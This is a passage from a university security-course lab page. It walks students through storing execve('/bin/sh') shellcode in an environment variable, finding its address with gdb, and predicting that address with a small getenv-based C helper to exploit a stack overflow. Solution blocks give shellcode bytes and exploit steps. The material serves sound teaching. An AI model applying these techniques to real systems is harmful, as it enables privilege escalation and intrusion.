mv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.0.2.2 51744 10.0.2.15 22
XDG_SESSION_CLASS=user
TERM=xterm-256color
USER=kali
SHLVL=1
XDG_SESSION_ID=5
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=10.0.2.2 51744 22
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/1
OLDPWD=/home/kali/Documents/Security/LINGI2144-2020-2022/shellcodes
_=/usr/bin/env
</pre></div>
</div>
<p>We can find our variable on the second line.</p>
<p>Of course we can also put some shellcode in an environment variable. We
can use <code class="docutils literal notranslate"><span class="pre">$(cat</span> <span class="pre">...)</span></code>to append our shellcode binary to a variable
like this :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ export SHELLCODE=$(cat shellcode.bin)
$ echo $SHELLCODE
1?1?1ə??̀j
         XQh//shh/bin??Q??S??̀
</pre></div>
</div>
<p>❓ <strong>This shellcode does not have a NOP sled so it would be hard to hit the
right address. Add some NOP before your shellcode and save it in the</strong>
<code class="docutils literal notranslate"><span class="pre">$SHELLCODE</span></code> <strong>variable.</strong></p>
<p>Great we now need to find where in memory this shellcode is located. We
can run our exploit program in <code class="docutils literal notranslate"><span class="pre">gdb</span></code> to inspect the stack.</p>
<p>❓ <strong>Run the program on gdb, break at main, inspect the stack and find your
env variable.</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 To inspect strings use</strong> <code class="docutils literal notranslate"><span class="pre">x/24s</span></code> <strong>instead of</strong> <code class="docutils literal notranslate"><span class="pre">x/**wx</span></code>.</p>
</div>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 The environment variables are at a higher address so you might
need to add some offset to the stack pointer.</strong></p>
</div>
<div class="collapse tp1_s0" id="tp1_0_1">
       <div class="panel panel-primary">
     <div class="panel-body"><div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ gdb -q exploit
(gdb) b main
(gdb) run AAAA
Breakpoint 1, 0x00401216 in main ()
(gdb) i r esp
esp            0xbffff4b4          0xbffff4b4
(gdb) x/24s $esp + 0x240
0xbffff624:   &quot;A&quot;
0xbffff626:   &quot;SHELL=/bin/bash&quot;
0xbffff636:   &quot;SHELLCODE=&quot;, &#39;\220&#39; &lt;repeats 190 times&gt;...
0xbffff6fe:   &quot;\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061ə\260\244̀j\vXQh//shh/bin\211\343Q\211\342S\211\341̀&quot;
0xbffff72c:   &quot;MYVAR=hacked&quot;
0xbffff739:   &quot;PWD=/home/kali/Documents/Security/LINGI2144-2020-2022/env-variable&quot;
0xbffff77c:   &quot;LOGNAME=kali&quot;
[...]
</pre></div>
</div>
      </div>
   </div>
</div><p>Now that you have located your variable you can pick an address in the
middle of your NOP sled. For me a suitable address is : <code class="docutils literal notranslate"><span class="pre">0xbffff69a</span></code></p>
<div class="collapse tp1_s0" id="tp1_0_2">
       <div class="panel panel-primary">
     <div class="panel-body"><p>Once you have your variable address you can go to the middle of the sled
by adding an offset.</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0xbffff636</span>
<span class="mh">0xbffff636</span><span class="p">:</span>   <span class="s2">&quot;SHELLCODE=&quot;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\220</span><span class="s1">&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">190</span> <span class="n">times</span><span class="o">&gt;...</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0xbffff636</span> <span class="o">+</span> <span class="mi">100</span>
<span class="mh">0xbffff69a</span><span class="p">:</span>   <span class="s1">&#39;</span><span class="se">\220</span><span class="s1">&#39;</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">110</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\061\300\061\333\061</span><span class="s2">ə</span><span class="se">\260\244</span><span class="s2">̀j</span><span class="se">\v</span><span class="s2">XQh//shh/bin</span><span class="se">\211\343</span><span class="s2">Q</span><span class="se">\211\342</span><span class="s2">S</span><span class="se">\211\341</span><span class="s2">̀&quot;</span>
</pre></div>
</div>
<p><code class="docutils literal notranslate"><span class="pre">0xbffff69a</span></code> will be my address.</p>
      </div>
   </div>
</div><p>So if we run our vulnerable program with the address of our shellcode
repeated in a large amount we should hit the <code class="docutils literal notranslate"><span class="pre">EIP</span></code>and execute our
shellcode.</p>
<p>❓ <strong>Spawn a shell using the environment variable.</strong></p>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp1_0_1 tp1_0_2",".tp1_s0","adding-environment-variable");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="go-even-further">
<h2>Go even further<a class="headerlink" href="#go-even-further" title="Permalink to this headline">¶</a></h2>
<p>That’s cool but that’s a bit trivious because we still need to guess the
shellcode’s address. Hopefully there is a system call that will help us
great time by giving us the address of the environment variable at
runtime : <code class="docutils literal notranslate"><span class="pre">getenv</span></code> !</p>
<p>❓ <strong>Write a small piece of C code that takes an environment variable as
input and prints its address.</strong></p>
<p>Eg :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ ./getenv SHELLCODE
SHELLCODE is at 0xbffff636
</pre></div>
</div>
<p>When you got your little helper you can check if the exploit still works
with the given address.</p>
<p>❓ <strong>Exploit the vulnerable program using the given address.</strong></p>
<div class="section" id="sledless">
<h3>Sledless<a class="headerlink" href="#sledless" title="Permalink to this headline">¶</a></h3>
<p>That’s good but our shellcode is still a bit long with all those NOP ops
at the beginning so let’s try to remove them !</p>
<p>❓ <strong>Put into</strong> <code class="docutils literal notranslate"><span class="pre">SLEDLESS</span></code> <strong>your shellcode without NOP sled.</strong></p>
<p>❓ <strong>Use your helper to fetch the address of</strong> <code class="docutils literal notranslate"><span class="pre">SLEDLESS</span></code> <strong>and try to spawn a
shell.</strong></p>
<p>Whoops it seems the address is not correct anymore. We should try to
investigate what could cause the address to change when running another
program (the helper).</p>
<p>❓ <strong>Change the name of your helper binary and fetch the address of the
shellcode. Try different lengths for example.</strong></p>
<p>❓ <strong>Try to found a pattern between the addresses that you get.</strong></p>
<div class="collapse tp1_s2" id="tp1_1_1">
       <div class="panel panel-primary">
     <div class="panel-body"><div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ cp a.out a
$ ./a SLEDLESS
SLEDLESS will be at 0xbffffea1
$ cp a.out bb
$ ./bb SLEDLESS
SLEDLESS will be at 0xbffffe9f
$ cp a.out ccc
$ ./ccc SLEDLESS
SLEDLESS will be at 0xbffffe9d
</pre></div>
</div>
<p>If you look closely you can see that when we make the name of the
program longer, the address decreases. Between <code class="docutils literal notranslate"><span class="pre">./ccc</span></code> and <code class="docutils literal notranslate"><span class="pre">./bb</span></code> we
got <code class="docutils literal notranslate"><span class="pre">0xbffffe9f</span> <span class="pre">-</span> <span class="pre">0xbffffe9d</span> <span class="pre">=</span> <span class="pre">2</span> <span class="pre">bytes</span></code> and the same amount between
<code class="docutils literal notranslate"><span class="pre">./bb</span></code> and <code class="docutils literal notranslate"><span class="pre">./a</span></code>. It looks like we decrease the address by two bytes
for every additionnal char in the program name.</p>
      </div>
   </div>
</div><p>When you think you found the pattern you can edit your previously used
helper to predict the right address of the shellcode.</p>
<p>❓ <strong>Write a C program that successfully predict the shellcode’s address.</strong></p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 It might seem a bit hard so here are the steps if you are stuck :</strong></p>
</div>
<div class="collapse tp1_s2" id="tp1_1_2">
       <div class="panel panel-primary">
     <div class="panel-body"><ul class="simple">
<li>store the address of the shellcode in a pointer</li>
<li>compute the difference of length between your helper program name and
your vulnerable program name</li>
<li>multiply the difference with the pattern you found previously</li>
<li>add the result to your shellcode address.</li>
</ul>
<p><strong>Explanation</strong> When we fetch the shellcode’s address from our helper
program (let’s say <code class="docutils literal notranslate"><span class="pre">./getenvaddr</span></code>) we first need to remove the length
of this program name from the shellcode’s address. Then we need to add
the length of our vulnerable program name.</p>
<div class="code C highlight-default notranslate"><div class="highlight"><pre><span></span>char *ptr;
ptr = getenv(argv[1]);
ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
/**               │                 │        │
*            ./getenvaddr      ./exploit   pattern
*              12 bytes          9 bytes   2 bytes
*                 └────────┬────────┘        │
*                       3 bytes              │
*                          └────────┬────────┘
*                                6 bytes
*/
</pre></div>
</div>
      </div>
   </div>
</div><p>❓ <strong>Spawn a shell using the predicted shellcode’s address.</strong></p>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp1_2_1 tp1_2_2",".tp1_s2","sledless");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
</div>
</div>


    </div>
      
  </div>
</div>
<footer class="footer">
  <div class="container">
    <p class="pull-right">
      <a id="up" href="#">
        <span class="fa fa-chevron-up"></span>
      </a>
      
        <br/>
        
      
    </p>
    <p>
        &copy; Copyright 2022, Legay Axel, Duchene Fabien, Crochet Christophe, Sebastien Strebelle, Thomas Given-Wilson, Schmitz Donatien.<br/>
      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.8.5.<br/>
    </p>
  </div>
</footer>
  </body>
</html>